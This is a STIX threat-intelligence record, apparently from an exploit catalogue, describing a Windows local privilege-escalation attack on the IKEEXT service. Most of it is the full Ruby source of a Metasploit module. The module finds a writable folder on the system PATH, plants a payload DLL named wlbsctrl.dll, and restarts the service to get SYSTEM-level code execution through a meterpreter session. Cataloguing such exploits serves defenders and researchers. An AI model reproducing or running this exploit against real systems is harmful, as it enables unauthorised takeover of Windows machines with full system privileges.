{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea347487-7332-4344-8548-38018d6bad75",
    "created": "2024-08-14T16:49:42.144017Z",
    "modified": "2024-08-14T16:49:42.144021Z",
    "name": "IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) Missing DLL",
    "description": " This module exploits a missing DLL loaded by the 'IKE and AuthIP Keyring Modules' (IKEEXT) service which runs as SYSTEM, and starts automatically in default installations of Vista-Win8. It requires an insecure bin path to plant the DLL payload.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ikeext_service.rb",
            "external_id": "ikeext_service.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.htbridge.com/vulnerability/uncontrolled-search-path-element.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::Accounts\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) Missing DLL',\n        'Description' => %q{\n          This module exploits a missing DLL loaded by the 'IKE and AuthIP Keyring Modules'\n          (IKEEXT) service which runs as SYSTEM, and starts automatically in default\n          installations of Vista-Win8. It requires an insecure bin path to plant the DLL payload.\n        },\n        'References' => [\n          ['URL', 'https://www.htbridge.com/advisory/HTB23108'],\n          ['URL', 'https://www.htbridge.com/vulnerability/uncontrolled-search-path-element.html']\n        ],\n        'DisclosureDate' => '2012-10-09',\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ben Campbell'\n        ],\n        'Platform' => [ 'win'],\n        'Targets' => [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'SessionTypes' => [ \"meterpreter\" ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread',\n          'WfsDelay' => 5,\n          'ReverseConnectRetries' => 255\n        },\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_mkdir\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new(\"DIR\", [ false, \"Specify a directory to plant the DLL.\", \"\"])\n    ])\n    @service_name = 'IKEEXT'\n    @load_lib_search_path = [\n      '%SystemRoot%\\\\System32',\n      '%SystemRoot%\\\\System',\n      '%SystemRoot%'\n    ]\n    @non_existant_dirs = []\n  end\n\n  def check\n    if !service_exists?(@service_name)\n      return Exploit::CheckCode::Safe\n    end\n\n    srv_info = service_info(@service_name)\n\n    vprint_status(srv_info.to_s)\n\n    case START_TYPE[srv_info[:starttype]]\n    when 'Disabled'\n      vprint_error(\"Service startup is Disabled, so will be unable to exploit unless account has correct permissions...\")\n      return Exploit::CheckCode::Safe\n    when 'Manual'\n      vprint_error(\"Service startup is Manual, so will be unable to exploit unless account has correct permissions...\")\n      return Exploit::CheckCode::Safe\n    when 'Auto'\n      vprint_good(\"Service is set to Automatically start...\")\n    end\n\n    if check_search_path\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def check_search_path\n    dll = 'wlbsctrl.dll'\n\n    @load_lib_search_path.each do |path|\n      dll_path = \"#{expand_path(path)}\\\\#{dll}\"\n\n      if file_exist?(dll_path)\n        print_warning(\"DLL already exists at #{dll_path}...\")\n        return true\n      end\n    end\n\n    return false\n  end\n\n  def check_system_path\n    print_status(\"Checking %PATH% folders for write access...\")\n    result\t= registry_getvaldata('HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment', 'Path')\n\n    if result.nil?\n      print_error(\"Unable to retrieve %PATH% from registry.\")\n      return\n    end\n\n    paths = result.split(';')\n    paths.append(@load_lib_search_path).flatten!.uniq!\n\n    paths.each do |p|\n      path = expand_path(p)\n      if exist?(path)\n        if check_write_access(path)\n          return path\n        end\n      else\n        # User may be able to create the path...\n        print_status(\"Path #{path} does not exist...\")\n        @non_existant_dirs << path\n      end\n    end\n\n    return nil\n  end\n\n  def check_write_access(path)\n    perm = check_dir_perms(path, @token)\n    if perm and perm.include?('W')\n      print_good(\"Write permissions in #{path} - #{perm}\")\n      return true\n    elsif perm\n      vprint_status (\"Permissions for #{path} - #{perm}\")\n    else\n      vprint_status (\"No permissions for #{path}\")\n    end\n\n    return false\n  end\n\n  def check_dirs\n    print_status(\"Attempting to create a non-existant PATH dir to use.\")\n    @non_existant_dirs.each do |directory|\n      begin\n        client.fs.dir.mkdir(directory)\n        if exist?(directory)\n          register_file_for_cleanup(directory)\n          return directory\n        end\n      rescue\tRex::Post::Meterpreter::RequestError => e\n        vprint_status(\"Unable to create dir: #{directory} - #{e}\")\n      end\n    end\n\n    return nil\n  end\n\n  def check_session_arch\n    if sysinfo['Architecture'] == ARCH_X64\n      if payload_instance.arch.first == ARCH_X86\n        fail_with(Failure::BadConfig, \"Wrong Payload Architecture\")\n      end\n    else\n      if payload_instance.arch.first == ARCH_X64\n        fail_with(Failure::BadConfig, \"Wrong Payload Architecture\")\n      end\n    end\n  end\n\n  def exploit\n    check_session_arch\n\n    begin\n      @token = get_imperstoken\n    rescue Rex::Post::Meterpreter::RequestError\n      vprint_error(\"Error while using get_imperstoken: #{e}\")\n    end\n\n    fail_with(Failure::Unknown, \"Unable to retrieve token.\") unless @token\n\n    if is_system?\n      fail_with(Failure::Unknown, \"Current user is already SYSTEM, aborting.\")\n    end\n\n    print_status(\"Checking service exists...\")\n    if !service_exists?(@service_name)\n      fail_with(Failure::NoTarget, \"The service doesn't exist.\")\n    end\n\n    if is_uac_enabled?\n      print_warning(\"UAC is enabled, may get false negatives on writable folders.\")\n    end\n\n    if datastore['DIR'].empty?\n      # If DLL already exists in system folders, we dont want to overwrite by accident\n      if check_search_path\n        fail_with(Failure::NotVulnerable, \"DLL already exists in system folders.\")\n      end\n\n      file_path = check_system_path\n      file_path ||= check_dirs # If no paths are writable check to see if we can create any of the non-existant dirs\n\n      if file_path.nil?\n        fail_with(Failure::NotVulnerable, \"Unable to write to any folders in the PATH, aborting...\")\n      end\n    else\n      # Use manually selected Dir\n      file_path = datastore['DIR']\n    end\n\n    @dll_file_path = \"#{file_path}\\\\wlbsctrl.dll\"\n\n    service_information = service_info(@service_name)\n\n    # Check architecture\n    dll = generate_payload_dll\n\n    #\n    # Drop the malicious executable into the path\n    #\n    print_status(\"Writing #{dll.length.to_s} bytes to #{@dll_file_path}...\")\n    begin\n      write_file(@dll_file_path, dll)\n      register_file_for_cleanup(@dll_file_path)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      # Can't write the file, can't go on\n      fail_with(Failure::Unknown, e.message)\n    end\n\n    #\n    # Run the service, let the Windows API do the rest\n    #\n    print_status(\"Launching service #{@service_name}...\")\n    if service_restart(@service_name)\n      print_status(\"Service started...\")\n    else\n      service_information = service_info(@service_name)\n      if service_information[:starttype] == START_TYPE_AUTO\n        if job_id\n          print_status(\"Unable to start service, handler running waiting for a reboot...\")\n          while (true)\n            break if session_created?\n\n            select(nil, nil, nil, 1)\n          end\n        else\n          fail_with(Failure::Unknown, \"Unable to start service, use exploit -j to run as a background job and wait for a reboot...\")\n        end\n      else\n        fail_with(Failure::Unknown, \"Unable to start service, and it does not auto start, cleaning up...\")\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-10-09",
    "x_mitre_platforms": [
        "[ 'win']"
    ]
}